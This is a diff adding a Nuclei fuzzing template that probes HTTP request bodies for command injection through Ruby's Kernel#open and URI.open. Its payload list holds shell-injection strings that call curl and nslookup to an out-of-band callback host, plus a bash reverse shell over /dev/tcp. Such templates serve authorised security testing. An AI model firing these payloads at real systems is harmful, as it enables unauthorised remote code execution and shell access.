@@ -1,0 +1,47 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{rce}}'
+    mode: single
+    part: body
+    type: postfix
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+    - http
+  payloads:
+    rce:
+    - '|nslookup {{marker}}|curl {{marker}}'
+    - '||nslookup {{marker}}|curl {{marker}}'
+    - '&& nslookup {{marker}}|curl {{marker}} &&'
+    - ; nslookup {{marker}}|curl {{marker}} ;
+    - $(curl http://{{marker}})
+    - '`curl http://{{marker}}`'
+    - ; bash -c 'curl http://{{marker}}' ;
+    - ; bash -c 'nslookup {{marker}}' ;
+    - ; bash -i >& /dev/tcp/{{marker}}/443 0>&1 ;
+  pre-condition:
+  - dsl:
+    - method == "POST"
+    - method == "PUT"
+    - method == "PATCH"
+    - method == "DELETE"
+    type: dsl
+  stop-at-first-match: true
+id: cmdi-ruby-open-rce-body
+info:
+  author: pdteam
+  description: "Ruby's Kernel#open and URI.open enables not only file access but also\
+    \ process invocation by prefixing a pipe symbol (e.g., open(\u201C| ls\u201D)).\
+    \ So, it may lead to Remote Code Execution by using variable input to the argument\
+    \ of Kernel#open and URI.open.\n"
+  name: Ruby Kernel#open/URI.open RCE
+  reference:
+  - https://bishopfox.com/blog/ruby-vulnerabilities-exploits
+  - https://codeql.github.com/codeql-query-help/ruby/rb-kernel-open/
+  severity: high
+  tags: fuzzing-req-body,fuzzing-req-rce,rce,dast
+variables:
+  marker: '{{interactsh-url}}'
